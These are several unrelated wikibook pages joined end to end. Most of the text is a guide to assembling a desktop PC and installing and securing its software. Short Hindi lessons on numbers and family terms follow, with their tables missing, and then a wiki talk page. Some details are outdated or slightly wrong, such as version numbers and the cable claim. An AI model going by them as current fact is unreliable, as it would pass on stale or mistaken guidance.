If you have an AGP video card:
Install the video card into the AGP socket. This is always the top expansion slot near the back of the computer. AGP slots are often brown, but can also be strange colours such as fluorescent green. Check the motherboard for levers (or similar devices) that are part of the AGP slot to help hold the card in place. These must be retracted before insertion of the card. Check the motherboard's manual for information on how to use these devices (if your motherboard has one.) Push the card into the socket (AGP slots are often pretty tight, do not be afraid to push it until it is well inserted), then screw it in at the top of the metal bracket. If it has a power connector, connect it to a 4-pin molex connector. If it has a pass through, do not connect it to a hard drive.

If you have a PCI Express video card, install it the same way as an AGP video card, however the slot where it goes looks a little different having an extra spot on the slot as opposed to the 2 slot parts on an AGP slot. PCI Express slots used for video cards are commonly 16x as opposed to AGP 8x.

When your card is properly installed the line formed by the top of the card will be exactly parallel to the motherboard, if one side seems to be higher than the other, chances are that it is not fully inserted, press a little harder on the high side or pull it out and try again.

=== Installing drive jumpers ===

[[Image:P-ata_and_80pin-cable.jpg|thumb|right|300px|The drive jumpers are in the middle (between the connector for the cable and the power connector) but the location may vary.]]

If you are using SATA drives there is no need to adjust jumpers -- you can skip this section.

Before you install IDE/ATA (PATA) drives, you will need to set the drives jumpers.
Each IDE/ATA channel can handle two drives, a master and a slave.
Consult your drive's instructions on how to set the jumpers. The jumper configurations are usually either printed on the back, or on the top of the drive. Drives can be configured in 2 ways: Drive Select or Cable Select.
[[Image:Jumper_(comp)_ubt.jpeg|thumb|left|100px|A jumper]]
* &quot;Cable select&quot;: Use this if you have 80-pin cables. Cable select automatically assigns slave/master based on the plug on the IDE cable the drive is plugged into. Put the jumper on CS.
* &quot;Drive select&quot;: If you are using a 40 pin cable, you must use &quot;drive select&quot;. Master/slave status is determined by the jumper. In this mode, configure the drive on the end connector as the master, and the drive connected to the middle connector as the slave. If the IDE channel has only one drive, check your motherboard documentation for the appropriate setting, which is usually master.

Note that Drive Select will always work, while Cable Select will only work if you have the proper cable.

=== Installing drives ===
Next install the hard drive and optical drives.

How a drive is physically installed will depend on the case.

[[Image:SATA_Data_Cable.jpg|thumb|right|120px|A Serial ATA connector]]
[[Image:Floppy Drive Cable-1.jpg|thumb|left|120px|Floppy Disk Drive Cable]]
Most new drives are SATA (Serial ATA) which use simple, small cables for a data connection. The ends of the cables are L shaped, just look carefully at the cable ends and the connector on the drive and match them up. Only one drive can be connected to each SATA port on the motherboard. Some SATA drives have two different power ports - make sure you connect ONLY ONE of these ports to the power supply, connecting both can damage the drive.

Older drives have PATA (Parallel ATA) connections which use a flat ribbon (IDE) cable for data connection. When using an IDE cable, plug the two connectors that are closer together into the 2 drives, and the third to the controller or motherboard. The connector furthest from the board should be attached to the drive set as Master. Make sure the drive that you will install your OS on is the primary master. This is the master drive on the Primary IDE bus which is usually the IDE 40 pin port on the motherboard labeled “Primary” or “IDE 1”.. 


{{NOTE|IDE connectors are often keyed, as to prevent inserting them backwards. It does not take much force to bypass this and possibly ruin your motherboard. Look carefully at the drive and the cable connection before you try to connect them. You should see a &quot;missing&quot; pin on the drive, and a corresponding blocked socket on the connector. If you break a pin on the drive, you will probably have a worthless drive.&lt;br&gt;

Most parallel IDE cables have a colored stripe down one side. That colored stripe signifies &quot;pin 1&quot; - and usually will line up next to the molex power connection on your drive. Use this rule of thumb if your connectors are not keyed.}}

Next, plug a 4 pin molex power connector into each hard drive and optical drive. If you are installing the power connector to a SATA drive, some drives have the option of using either the SATA power connector (a flat about 1&quot; wide connector) or the standard molex connector; use one or the other, ''not both''. Connecting both can break your hard drive. For better data transfer, you can purchase heat-protected high-end data cables at your nearest electronics store.

If you install a floppy disk drive, the cable is very similar to the IDE cable, but with fewer wires, and a strange little twist in the middle. Floppy drives do not have master/slave configurations. The floppy disk connector is not usually keyed, making it all too easy to plug it in the wrong way! One wire in the IDE cable will be colored differently: this is pin 1. There is usually some indication on the floppy drive as to which side this is. The power plug for a floppy is 4 pins in a line, but rather smaller than the standard hard drive power connector. Plug the end of the cable with the twist into the floppy drive (&quot;drive A:&quot;). Plug the other end of the floppy ribbon cable into the motherboard. If you install a second floppy drives, plug the middle connector into &quot;drive B:&quot;. The twist between drive A: (on the end) and drive B (in the middle) helps the computer distinguish between them.&lt;ref&gt;[http://www.pcguide.com/ref/fdd/confCable-c.html PC Guide]&lt;/ref&gt;

=== Other connections ===

[[Image:Mainboard_pins.png|thumb|right|300px|Some cables are attached to pins on a board (e.g. motherboard or extension card)]]

In order to turn the computer on, you will need to connect the power button and while you are at it, you might as well do the reset buttons and front panel lights as well.


There will be a set of pins, usually near the front edge of the motherboard to which you will attach the cables sometimes already connected to the front of the case, or if needed supplied with the motherboard. Most of the time the plugs will be labeled as the pins they will connect to in the motherboard, there they can be difficult to read since the print is very small or you may not be in the right orientation to do so.  The documentation that came with your case and motherboard should tell where these connectors are.

{{NOTE|The front panel LEDs are polarized: usually the positive wire is a color while the negative wire is white or black, this may be important if you have to do alterations or do not have the proper cables.}}

In addition, you can connect any case-specific ports if they are supported by the motherboard. Many cases have front mounted USB, Firewire and/or sound ports.

{{DecoratedTextBox|image=Bulbgraph.png| 
Other connections of this type to remember can be power for the CPU fans, various temperature sensors and [[w:Wake-on-LAN|Wake-on-LAN]] cables (if the feature is supported) from the network card to the motherboard.
}}

=== Prepare for power up ===
Some people will put power to a system several times during assembly and for experienced builders this may serve some purpose. For first timers though, it’s best to assemble a minimal complete system before powering up. Minimal because that way there are comparatively few potential sources of trouble, complete so that you can test everything at once and because the fewer times you have to put power to an open machine, the better..

If you’ve been working along with us you should now have such a minimal system put together. Briefly this includes a case with a motherboard in it, a processor (and its cooling unit) and some RAM plugged into the motherboard, hard and floppy drives installed, and some kind of video available. If your motherboard has built-in video, you might want to use that for this first try, even if you are going to install a video card later.

For this test, you’ll want to have the computer open, so that you can see all of the fans, and you’ll need to connect a monitor and a keyboard and a mouse (OK, you don’t really need the mouse . . .) 

[[File:Connection screen.jpg|thumb|180px|Comparison of VGA, DVI and HDMI]]

Monitors will either have a VGA, DVI, or a new HDMI plug (see picture, as they are a lot less apparent than PS/2 / USB  by comparison). Most monitors use VGA connectors, and so most graphics cards have VGA output. If you have one type of plug and the graphics card has another, you can easily buy an adapter. Some cards even come with one.

There are two standard connectors for mice and keyboards; PS/2 connectors and the more modern USB connectors. Plug the mouse and keyboard in the appropriate slot. 

Note: If you intend to install an operating system from a boot CD or floppy, or modify BIOS settings you will need to use either a PS/2 keyboard, a USB to PS/2 converter, or a motherboard that supports USB devices. Otherwise your keyboard will not work until the operating system has loaded USB drivers.

Once you have this all set up, it’s time to double check, then triple check that you have made all the necessary connections and that you haven’t left any foreign objects (where’s that screwdriver?) in the case.

== Power up ==
Take a moment to check one more time that everything is as it should be. Make sure you've removed your wrist strap, turn on the monitor, then press the power button, and observe the inside of the open machine. (''Do not touch any part of the inside of the machine while it is powered up – you will NOT die but your computer might.'') The first thing to look for is that the CPU cooler fan spins up, if it does not, cut the power immediately. This fan should start up right away; something is wrong if it doesn’t and your CPU is in danger of overheating so stop now and troubleshoot. 

'''NOTE:''' If you have a Gigabyte brand motherboard, the CPU fan may twitch and stop turning.  Wait 10-15 seconds and it should start.  If it does not, there is a problem and you should immediately cut power as stated above.  Other fans such as case fans should turn on and spin.

If the CPU fan spins up, check that all the other fans that should be spinning – case fans and fans on the power supply and video card (if installed) are also spinning. Some of these fans may not spin up until a temperature threshold is passed, check your documentation if anything is not spinning.

If the fans spin, you can turn your attention to the monitor, what you are hoping to see is the motherboard’s splash-screen, usually featuring the manufacturer’s logo. If you see this, take a moment to bask in the glow, you’ve built a computer!

If this happy event does not occur, if smoke appears, or if the computer does not do anything, unplug the power cord immediately and check the steps above to make sure you have not missed anything. Give special attention to the cables and power connections.  If the computer does appear to come on, but, you hear beeps, listen carefully to the beeps, turn the computer off, and refer to your motherboard's manual for the meaning of the beeps.  Some boards have an optional diagnostic device, usually a collection of LEDs, which when properly plugged in will inform you of the nature of the problem.  Instructions for installing this as well as the meaning of its display should be in the manual for the motherboard. If the computer turns on but the only thing that comes on is your power supply, turn it off. This probably means something is shorted, and leaving it on could damage the parts.

If all is well it is time to turn the computer off, and close it up. Then you may want to turn it on again and set certain options in the Computer's BIOS (usually by pressing 'F1' or 'Del' a few seconds after boot.) These options will be explained in the motherboard manual. In general, the default options are OK, but you may wish to set the computer's hardware clock to the correct time and date. The BIOS is also where you determine the default boot order of the system, typically Floppy, then CD-ROM, then Hard Disc.

If you want a further quick test, before you install an operating system, you may find a bootable CD-ROM such as [http://www.knoppix.net Knoppix] extremely useful.

== Additional hardware and peripherals ==

Now that you have a working system it’s time to think about installing an operating system, which is covered in the next section. It’s best to leave the installation of additional components (like  sound-cards, modems, and second video cards) and peripherals (printers, joysticks, etc. ) until after the OS install in order to allow the plug n’ play features of the OS to do their trick.

      <text xml:space="preserve">{{How To Assemble A Desktop PC/Contents}}

Now that you’ve got a functioning computer, you’ll need to install some software if you’re going to do anything with it.  An operating system or two must come first, then hardware drivers (so that the operating system can access your hardware) followed by security software and utilities. And that’s as far as we’re going to go with you, but you’ll also want to install some application software – games, word processors, databases, programming languages – whatever floats your boat... That’s pretty much the point of this whole computer business after all, though I hope you’ve found the journey of building it yourself has been worthwhile in its own way.

In this section we’ll consider what software you’ll want to install and how you might go about doing so.

== BIOS updates ==

The first thing you want to do after you have a working PC is to update the BIOS (called &quot;flashing&quot; the BIOS).
Download the flash update on another computer and put it on a USB thumb drive (or a floppy disk) and boot the computer with it.
(If you don't have another computer or thumb drive, then put off this step until after you install the operating system and get this computer connected to the network.)

== Operating system(s) ==
After you have flashed the BIOS (if you have), you should then start installing an operating system (OS). You can select from several available on the Internet or from your local computer store.  The first option, and the one taken by most people, is to install Microsoft Windows, of which the current version is Windows 8. Another option is to install a GNU/Linux distribution (a Free Software operating system). There are many other operating systems to choose from as well, including other free operating systems, such as BSD. Note that you also have the option of installing more than one operating system in what is called a multiboot setup.

If you are going to install both, install Windows first. This is because Windows overwrites the software that GNU/Linux requires to start up, even if something is already there.  If you install Windows before all of your other systems, you will be able to easily boot into all of them.

Choosing between Microsoft Windows, GNU/Linux, or one of the other operating systems is largely dependent on what software you need to run. Simply put, can you accomplish your day to day tasks with the software that will run under the operating system in question? Microsoft Windows is the more commonly used system, but GNU/Linux wins in terms of security, software availability, ability to run on older equipment, and cost.  Both systems have a range of software, but determine your needs before installing either operating system.

Note that, having installed Windows, you can always install GNU/Linux later and, conversely, if you install GNU/Linux first, there is no throwaway cost to regret if it turns out later that you need Windows.

=== Installing Windows ===
The installation of Windows is relatively easy. Push the power button on the front of the PC, put the CD-ROM or DVD-ROM in your optical drive, and follow the on-screen instructions (you may have to restart with the CD in place). If you are doing a Windows-only install, just allocate all of the hard drive to Windows. Again, for a Windows only install, the NTFS file system is faster and more efficient.

Some people find that it's useful to create separate partitions for the operating system and data.  This means that if something goes wrong with the operating system, the partition can be formatted and the operating system can be reinstalled  possibly without losing data.

If you are installing Windows on a RAID drive, or a SATA drive in some cases, you are going to have to provide drivers to the Windows installer so that it can access the hard drive on the raid controller. To do this during the Windows install wait for &quot;Press F6 to install any third party SCSI or RAID drivers.&quot; to appear at the bottom of the screen and duly hit F6. Then you will see a screen that says &quot;Setup could not determine the type of one or more mass storage devices installed in your system, or you have chosen to manually specify an adapter.&quot; At this screen you are going to want to hit 'S' to &quot;Specify Additional Device,&quot; another screen will pop up asking you to insert the floppy disk containing the drivers, followed by a screen asking you to choose the appropriate driver out of the set contained

=== Installing Windows to dual-boot with GNU/Linux  ===

If you are dual-booting, some extra factors must be considered. NTFS, which is the default file system that Windows uses, is fairly well supported in Linux. [http://www.ntfs-3g.org/ NFTS-3g] has reached a usable stage, with users reporting no data corruption or loss during ordinary use of the latest versions of the driver, providing GNU/Linux users with a reliable way to read and write NTFS partitions. This system is now in widespread use and most up-to-date Linux distros will support the NTFS file system. Previously only read support was safe, and this may still be the case for some distributions. However, NTFS does have some advantages over FAT32, in that a 4GB file size limit no longer exists. Though Linux supports NTFS, Windows does not have built-in support for any of the standard GNU/Linux file systems. However, there are Windows applications, such as [http://www.fs-driver.org/index.html Ext2 IFS] that can be used to read/write ext2 and ext3 systems.

When it comes the time to partition the hard disk(s), remember to leave space for GNU/Linux (a good amount is on the order of a third of your total hard disk space). You may want to have a spare FAT32 partition (of around 1 third of your disk space) on which to share documents between Windows and GNU/Linux, though this will most likely not be necessary unless you are using a distro which cannot read/write NTFS.  You should also modify the partition table as necessary - you may not need as much space for Windows or you may need more in your FAT32 transfer area.  But you must ensure that you leave at least 3GB for your Windows installation, since the standard installation of Windows takes up about 2 GB of hard drive space, and it is always wise to leave a bit extra on, to allow for any changes that may occur.

=== Installing GNU/Linux ===
{{see also|Linux Guide}}
{{see also|Wikipedia:List of Linux distributions}}
{{see also|Wikipedia:Comparison of Linux distributions}}

The primary problem faced in installing GNU/Linux is choosing between distributions. Of the many variants of GNU/Linux, Fedora, SuSE, and Ubuntu are generally recommended, as they are updated regularly and compatible with a broad range of hardware:

* Fedora, currently at version 17. Used to be the de facto GNU/Linux.
* SuSE, currently at version 11.4.
* Ubuntu, currently at version 13.4. Increasingly gaining popularity as an easy to use desktop GNU/Linux.

Some GNU/Linux variants may support hardware that these do not. If you have obscure or old hardware, you may want to search forum sites for various GNU/Linux variants to ensure compatibility. For example, Puppy Linux is a small Linux distro designed to run on older systems, as is Damn Small Linux.

For example, let’s consider Ubuntu. It's a variant of Debian, and is the current standard for easy-to-use GNU/Linux distributions. One can download the .iso image or order a CD set (containing a combined installation CD and LiveCD) from its website. An .iso is nothing more than a special file format that your CD drive burning software uses to create a copy of the software, in this case a copy of Ubuntu GNU/Linux.

The installation of most distros GNU/Linux is relatively easy. Push the button on the front of the PC, put the CD-ROM in your optical drive, and follow the on-screen instructions. By default, the installation version of Ubuntu will erase all files on the hard drive and partition 1.8 GB for the OS. If you want to customize, follow the on-screen instructions carefully.  The LiveCd version does not erase your hard drive and is intended solely for a user to test drive Ubuntu GNU/Linux.

When installing a GNU/Linux distro, you may be asked to choose between alternatives – whether to run KDE or Gnome, for instance, or to install vi or Emacs or nano. If the terms are unfamiliar a quick Google will usually bring enlightenment. Also, as in these two examples, most such choices are a matter of preference and either choice will work.

== Security ==
After installation, security should be your priority. 

=== Updates ===
From time to time, software companies and independent programmers release new and improved versions to their software; these are known as updates.  Updates usually install new features or fix problems. Usually, you should download the latest updates to improve system performance though it's sometimes wise to wait a little while to be sure the update itself does not cause problems.  Many programs update themselves and this process is know as an automatic update.  If you have to manually update your software, do so through the software developer's site, not through a secondary source.  This approach will reduce the chance of contracting a virus or other piece of malicious software.

==== Windows ====
A newly installed Windows computer using a broadband connection can be attacked within moments of being connected to the Internet. In severe cases, the attacks can render a system unbootable or make a second reinstallation faster or easier than manually removing the malicious programs causing the problems. The SANS Institute provides a PDF guide called [http://isc.sans.org/presentations/xpsurvivalguide.pdf Windows XP: Surviving the First Day], which explains how to update a new Windows XP box without immediately becoming infected by viruses and worms. To avoid having your new computer attacked, install a firewall, or activate the one that came with your OS. Both Windows and GNU/Linux have in-built firewalls: In some GNU/Linux distributions, it is enabled by default; in Windows XP Service Pack 2, it can be found by going to the Start button and choosing &quot;Control Panel&quot; then double-clicking the &quot;Windows Firewall&quot; icon.

As soon as you are on the Internet, run your operating system's update facility to fix any security flaws that have been found since your CD was printed.  To do this under Windows, simply click on your Start Menu, click on 'All Programs', and then click on Windows Update, and follow the instructions. If you use other Microsoft products, such as Microsoft Office, then it can be valuable to use [http://update.microsoft.com Microsoft Update], which covers updates for all Microsoft products. For either of these, you can also switch on &quot;Automatic Updates&quot; from the Security Center program mentioned above.

==== GNU/Linux ====
[[Image:YaST2-openSUSE-11.png|thumb|The YaST (Yet another Setup Tool) Control Center]]
The method of updating your GNU/Linux system varies greatly from distribution to distribution. 

For SuSE, there are two ways:
# YaST (Yet another Setup Tool), the default package manager/system management tool for SuSE
# ZENworks updater, a GUI-based updating service

For Fedora, type
: &lt;code&gt;yum update&lt;/code&gt;
as the root user inside a terminal window.

It is perhaps easiest to update the OS from Debian-based distributions such as Debian, Ubuntu and Linspire. For Debian and Linspire you type the following into a terminal window while running as the root user:
: &lt;code&gt;apt-get update&lt;/code&gt;
: &lt;code&gt;apt-get dist-upgrade&lt;/code&gt;

Ubuntu has you run sudo to switch run a program as root. Type the following into a terminal:
: &lt;code&gt;sudo apt-get update&lt;/code&gt;
: &lt;code&gt;sudo apt-get dist-upgrade&lt;/code&gt;

Most distros, including Ubuntu, also have a GUI-based updater program.

==== Automatic updates ====

If your computer will be running overnight (or if you're just lazy), it may be good to have your computer update itself.

'''Debian-based (LINUX) -''' [[w:Debian|Debian]]-based operating systems (including Ubuntu, but Ubuntu already has a more simplified automatic updater) will typically use a [[w:cron|cron]] script for receiving automatic updates by the console (although you can download some GUI-based updating tools - that is, if you're working with a GUI).

'''Ubuntu (LINUX) -''' As Ubuntu is based on Debian, you can use a cron script, but an easier way of doing it (if you're using [[w:GNOME|GNOME]]) is to go to the &quot;System&quot; menu, then &quot;Administration&quot;, then &quot;Software Sources&quot;. Then open up the &quot;Updates&quot; tab and select &quot;Automatic updates&quot;, also select &quot;Install security updates without confirmation&quot;. 

'''SuSE (LINUX) -''' SuSE uses [[w:YaST|YaST]] to manage updates, packages (applications), and system settings. YaST can be configured to use automatic updates in the YaST control center.

'''Microsoft Windows -''' Microsoft has always used the [[w:Windows_Update#Future|Microsoft Update]] service (formerly called &quot;Windows Update&quot;) to manage updates both automatically and manually (although by default it usually is a automatic update). Windows Vista reminds you when the computer is needed to be restarted if an update requires one via a special icon in the notification area.

=== Anti-malware ===
Anti-virus, anti-spyware, and anti-spam programs (which generically are all called anti-malware programs) of commercial quality or better can be found for free online quite easily and can protect your computer from various nasties you might get while surfin' on the Internet. Windows programs are listed in the software section below. (Usually these are not needed for non-Windows OSes). Third-party firewalls for Windows are recommended as the built-in default one Windows provides is not nearly powerful as, for example, ZoneAlarm, a third-party Firewall solution that not only monitors incoming traffic, but monitors outgoing traffic as well.

Security software is important and should be set up first. The best procedure is not to connect to the Internet at all until your choice of anti-virus, anti-spyware and firewall software is installed and activated, then connect to the Internet and update each of these programs. 

If you are using software that must be downloaded from the Internet for this purpose, you can use another computer to download and burn the installation files to a CD or thumb drive. If this is not possible, download, install and update your anti-virus solution of choice first, disconnect from the Internet and run a complete system scan. Then you can reconnect and install your other security software and be reasonably confident that you are not infected. 

Once secured, your system should be safe for prudent Internet browsing, remember to schedule regular scans and keep your security software up to date.

== Drivers ==
Now that your computer is relatively secure, you will need to install software to control your various hardware components. This type of software is known as a [[Wikipedia: Device_driver |driver]]. 

Although, most of your hardware will come with a CD containing the necessary driver, consider downloading the driver straight from the company's Internet site.  This will ensure you have the latest edition of the software. Knowing where to download the driver is also good in case you lose the CD that came with the device.  

If you do not have a fast Internet connection (broadband), the company usually provides an option to receive the driver cd in the mail, in which case you'll want to use the CD you have now and update the driver later.  Even if something seems to be working fine, downloading new drivers may help increase computer efficiency, though there is always a risk that a brand new version may break something. Downloading drivers for your motherboard's chipset can often help if you are having a problem. Finally, many monitors will not go above a certain refresh rate without the proper driver, which may be of great concerns to gamers.

If you are using Microsoft Windows, you can generally find drivers for your selected hardware on the manufacturer's website.  Most GNU/Linux systems already have all of the drivers installed, with the exception of proprietary modem and graphics drivers.  If you can't find the driver you need, a simple [http://www.google.com Google] search will  often yield the best results.

== Software ==

Before buying software for your new PC, remember that there is an abundance of useful software, free for the downloading, available on the Internet. From web browsers to word processors to graphic manipulation programs, there is plenty of software available online.

Though most of what is available is safe and useful, it’s always a good idea to do a little research and make a backup before installing anything new. The following are some proven and reliable programs that are available, free (or gratis), for individual use (and sometimes more, check the license). 

Broadly speaking, there are three types of licenses:
* Proprietary - This is the type of license that comes with most software that is purchased. Source code is not available, and you cannot make copies for others.
* Freeware - The software is zero cost (free), and you may share copies with others. You cannot make copies and sell them, however. The source code is usually not available.
* Free software/Open Source - The source code is available. This means that if you know how to program, you can make and distribute variations of the program yourself, fix bugs you find, etc. You may share copies with others, and you may pay for the software on disk, or download it for free. (The &quot;free&quot; in &quot;free software&quot; refers to &quot;free&quot; as in &quot;free speech&quot;, not as in &quot;free beer&quot;.) 

Of course, there is a lot of overlap and many exceptions to these generalizations. Be sure to check the license that comes with your software to be sure of what your rights are!

To ease out the installation process for utilities and other basic software, you can use [http://www.ninite.com Ninite]. Check all the software that you need and download the installation utility. However, note that this utility will only install in your Windows partition and you cannot manually specify the directories in which you want the applications installed.

=== GNU/Linux ===

Unlike Windows, on a GNU/Linux system the majority of the software that you will want for everyday use of your computer is usually included. You will probably not need to download anything. Most GNU/Linux distributions have a package manager (Portage for [[w:Gentoo|Gentoo]], APT for Debian-based distros like Debian and Ubuntu, etc.) For some distributions you can simply download RPM or DEB files from your distribution's web site.

If they aren't already installed by your distribution:
* Web Browser: [[w:Firefox|Mozilla Firefox]], [[w:Google Chrome|Google Chrome]]/[[w:Chromium_(web_browser)|Chromium]], [[w:Konqueror|Konqueror]] or [[w:Opera (Internet suite)|Opera]].
* EMail Client: [[w:Mozilla Thunderbird|Mozilla Thunderbird]], [[w:Evolution (software)|Evolution]], or [[w:Kmail|Kmail]]
* Office Suite: [[w:OpenOffice.org|OpenOffice.org]], [[w:LibreOffice|LibreOffice]], or [[w:KOffice|KOffice]]
* Instant Messenger: [[w:Pidgin_(software)|Pidgin]] or [[w:Kopete|Kopete]].
* Media Players: [[w:Totem|Totem Media Player]], [[w:Rhythmbox|Rhythmbox]], [[w:mpd|mpd]], [[w:amaroK|amaroK]] (depending on what desktop environment you use), [[w:Beep Media Player|Beep Media Player]] or [[w:Video Lan Client|Video Lan Client]].
* Movie/DVD Player: [[w:Xine|Xine]] or [[w:MPlayer|MPlayer]].
* Windows Compatibility Layer: [[w:WINE (software)|WINE]].
* x86 Emulator: [[w:QEMU|QEMU]] or [[w:VMWare Server|VMWare]].
* PPC Emulator: [[w:PearPC|PearPC]].
* Photo Editing: [[w:GIMP|GIMP]].

=== Additional Software ===
For additional software some excellent sources of free and open-souce software are

*[http://filedoggy.com FileDoggy] - Free only software and its updates with links to developers pages in one place. 
*[http://filehippo.com FileHippo] - Windows only software, up to the bleeding edge on all updates. Also includes links to developers pages, if you're interested in Linux or Mac versions of software. Also has automatic updates software. 
* [http://www.tucows.com Tucows] - a downloads site with freeware, shareware, open-source as well as commercial software.  It has many mirrors all over the world for speedy downloads from local servers.
* [http://www.download.com/ Download.com] - similar to tucows
* [http://www.sourceforge.net SourceForge] - a site featuring many OpenSource projects.  You can start your own, or get software for almost every need.  Most projects have GNU and Windows versions.  The mirror system isn't as large as Tucows, but you can still usually get a mirror on the same continent.
* [http://www.linuxrsp.ru/win-lin-soft/table-eng.html Table of equivalents] - can be useful if you want to know more about specific programs when changing from windows to GNU or vice-versa.

Of course, it is also possible to ''buy'' copies of software, particularly for the Windows operating system.

      <text xml:space="preserve">{{How To Assemble A Desktop PC/Contents}}


If you're serious you’ve probably at least glanced over this book as you considered building your own computer, and I hope it has inspired you to go ahead with that project. Throughout we’ve tried to steer you clear of some of the pitfalls and alert you to some of the safety issues involved, and in so doing, we have undoubtedly overemphasized the dangers and difficulty. In sooth, it’s pretty hard to hurt yourself building a computer and most people get through their first build without burning up any parts. With a little planning, anyone who can use a screwdriver can build a computer.

The computer you build will always mean a little bit more to you than one you buy, not least because you designed it yourself and will no doubt be upgrading it from time to time for years to come. You may find a little smile of satisfaction creeping onto your face each time you hit the power button, and I think you’ll find that smile is an ample return for your time and effort.

Lastly, if you go through with it and build your own PC, you’re bound to run into something we've missed here; a problem we didn’t anticipate, something we forgot to mention, or something that has changed recently. If you do, please come back here and add to or change this book. You don’t have to know everything to contribute, just one thing that’s true. If this guide has helped you at all, think of it as payback.

Hindi cardinal numbers up to 100 have no specific standardization. Up to 20, the numbers are unique. After that each tenth number (such as 30, 40 etc) is unique. The rest of the numbers take the form of prefix of incremental digit and the base of preceding tenth number. However these prefixes and bases vary slightly and random manner. Although the pattern isn't regular, don't worry too much. They're just slightly different and with some practice you'd soon get the hang of it. Here are the numbers from 21 to 100. Try to follow them and find any similar pattern.

Once you have got through the numbers 1-100 the rest of the numbers are regular. For example if we need seven hundred sixty seven it will be सात सौ सड़सठ (sāta sau saṛasaṭha).

Another point to be noted in Hindi in case of cardinal numbers is that Hindi (and all other Indic languages) often use quantities like lakh and crore which are less common in English speaking countries. The opposite is true for quantities like million, billion (We are talking about the US billion which is 1 followed by 9 zeros, not the UK billion which is 1 followed by 12 zeros!), zillion etc. Let's roll on to bigger quantities now!

===Ordinals===
Hindi ordinals are a piece of cake once you are thorough with the cardinals. Only the first six ordinals are unique.

As you would have noticed by now that in Hindi 'वां' acts just like 'th' in English which you can add to the end of cardinal numbers to form the corresponding ordinal numbers. If you're wondering about the irregularities of the second options, then let us just tell you that they are the Sanskrit ordinal numbers that are used often in Hindi. You just have to remember ten of them (for they sometimes appear in texts/speeches). After ten, any ordinal numbers you would encounter would be most likely in the general form of ordinal number+&lt;i&gt;vāṃ&lt;/i&gt;

'''Note''' :- As we mentioned before that the Hindi cardinal numbers are not standardized and several variants exist for the same number. For example सड़सठ and सरसठ are both correct for representing sixty seven. All of these variant forms could be considered correct, however for maintaining uniformity throughout this wikibook we'd be using the forms that are mentioned in this text which is also advocated by the Central Hindi Directorate, Government of India, Ministry of Education and Social Welfare (BGMH, pp. 64-5)

      <text xml:space="preserve">{{Hindi}}
Family relation names in Hindi are very specific to the speaker. For example there are different names for your uncles such as your father's brother and your mother's brother. Since these vary a bit from place to place, the following are some standard examples. The listed words are the names that one would use to refer to a relative of a specified relation, not the generic word for an uncle for example. This is because there are often different words to express a maternal relation and a paternal one. The same occurs for elder family members vs younger ones.

Note the polite word जी (jii or ji) is often added as a suffix to names to denote respect. It is very common to use when referring to or especially addressing an elder, and sometimes for others depending on customs or the situation.

The transliteration from the [[devanagari]] is in [http://en.wikipedia.org/wiki/ITRANS ITRANS] form, which allows for perfect transliteration, meaning accurate representation of the characters in a different script. Commonly if the transliterated form is written for casual usage, a simpler approximation is used, such as spelling the doubled vowels with just one and not bothering to use the correct capitalized forms to denote the retrolflex vs dental consonants. For example दादाजी would often be spelled dadaji instead of the more precise transliteration daadaajii, and similarly बेटी would often be written as beti instead of beTii. These simpler cases are ambiguous, but if the context is known, the correct spelling and pronunciation can be inferred.

      <text xml:space="preserve">This is a cool book. You might want to consider inserting &lt;nowiki&gt;__NOTOC__&lt;/nowiki&gt; to suppress of the automatic table of contents on pages like [[Dichotomous Key:Hexapoda]] (just place &lt;nowiki&gt;__NOTOC__&lt;/nowiki&gt; as the very last line of the page, as I've done it on that page). --[[User:Andreas Ipp|Andreas]] 10:15, 20 Mar 2005 (UTC)

== Beginner's question ==

Hi, I like this book, but I am no expert on this field. I just tried to see, if I can use the book nevertheless. As a test, I wanted to go from &quot;Start&quot; to &quot;dog&quot;, but I already failed at Animalia #5: Which part is developing first? Or is it a Bilaterium at all? What is the correct path to &quot;dog&quot;? (I would be nice, to have links from certain keywords to Wikipedia where those technical terms are explained). --[[User:Andreas Ipp|Andreas]] 09:11, 2 Apr 2005 (UTC)
:If you go down to the bottom of [[Dichotomous Key:Animalia]], there's a glossary box.  It isn't filled in or easy to find at the moment, but I'm getting there.  That wouldn't really help you identify a dog either, since you'd need to inspect fetal dogs to see whether the mouth or anus develops first in order to answer that question.
:Regarding the difficulty in going from start to dog, little can be done about it, really.  The higher taxa like Chordata, for example, are distinguished by technical characteristics that may be difficult or impossible for most people to describe.  I've been kicking around in my head some ideas about having alternate keys.  For example, next to Animalia#5, there could be a separate key leading either to a new section or new page that would use more easily identifiable characteristics.  The problem is that, especially in the higher taxa, the only really good characteristics are difficult for laymen to identify -- if there was an alternate key of some sort, it would be much more complicated to make because there would be numerous exceptions and caveats.
:FTR, dogs are deuterostomes.  Also, they have a notochord.  Once you get that far (this would take you to [[Dichotomous Key:Chordata]]), the rest of the keys you should be able to follow without too much difficulty.  (nobody's done the [[Dichotomous Key:Canidae]] yet, so you won't actually be able to get all the way down to the dog -- unfortunately, I don't think there are any very familiar animals done all the way to species yet) [[User:TUF-KAT|TUF-KAT]] 15:12, 2 Apr 2005 (UTC)
::There is now a familiar species that can be traced all the way from start to finish -- humans.  Like dogs, they (we) are deuterostomes and they have a notochord.  You also have to be able to count molar cusps to get all the way to the end, but the rest of it should be easy to follow. [[User:TUF-KAT|TUF-KAT]] 17:55, 2 Apr 2005 (UTC)
::BTW, I should probably mention here that I have proposed moving the Dichotomous Key (and [[Field Guide]]) to Wikispecies, because it seems likely to get more attention from knowledgeable people there, and it fits in well with that project's scope. Nobody at the Wikispecies Village Pump has replied, so I'm not going to do it in the immediate future, but I think it will happen sooner or later. [[User:TUF-KAT|TUF-KAT]] 18:00, 2 Apr 2005 (UTC)

::: Thank you very much for the answer. I think the way you implemented the glossary on [[Dichotomous Key:Mammalia]] is the most useful and intuitive way. It would be sad to loose a good book from Wikibooks, but it definitely looks like there is more connection with Wikispecies. Anyhow, this book will profit from tight linking to both Wikipedia and Wikispecies. What you should demand as soon as possible (even if you decide to move your book later), is to have a prominent link to your book, possibly even on the main page of Wikispecies. This might also draw experts' attention to this wikibook.
::: Another suggestion (from the naive novice?): I don't know if it is a good idea, but it might be helpful for some questions (like the one which opening develops first) to have a few well-known examples that would follow later down the road (e.g. &quot;Deuterostomes (containing e.g. dogs)&quot;). That could help sometimes in pointing to the right direction at least... --[[User:Andreas Ipp|Andreas]] 04:29, 3 Apr 2005 (UTC)
::::Thanks for the advice.  I've been considering ways to incorporate something along the lines of your suggestion.  I'll see what I can come up with. [[User:TUF-KAT|TUF-KAT]]

== Unused Templates ==

I have found a number of unused templates that seem to deal with this wikibook. Let me know if any of these are still useful:

*[[Template:Animalia]]
*[[Template:Arthropoda]]
